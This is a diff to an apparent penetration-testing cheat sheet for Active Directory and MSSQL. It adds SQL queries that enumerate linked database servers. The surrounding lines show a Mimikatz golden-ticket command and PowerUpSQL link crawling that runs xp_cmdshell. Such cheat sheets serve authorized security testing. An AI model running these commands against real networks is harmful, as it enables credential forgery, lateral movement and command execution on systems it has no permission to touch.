@@ -873,6 +873,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 . .\PowerUpSQL.ps1
 ```
+ 
 ### Check connections
 #### Discovery of SQL instances (SPN scanning)
 ```
@@ -911,6 +912,16 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmi
 ```
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
+```
+
+#### Manually enumerate database links query
+```
+SELECT * FROM master..sysservers
+```
+ 
+#### Query a link for links
+```
+SELECT * FROM OPENQUERY("UATSERVER\DB2", 'SELECT * FROM master..sysservers;')
 ```
 
 ### Audit
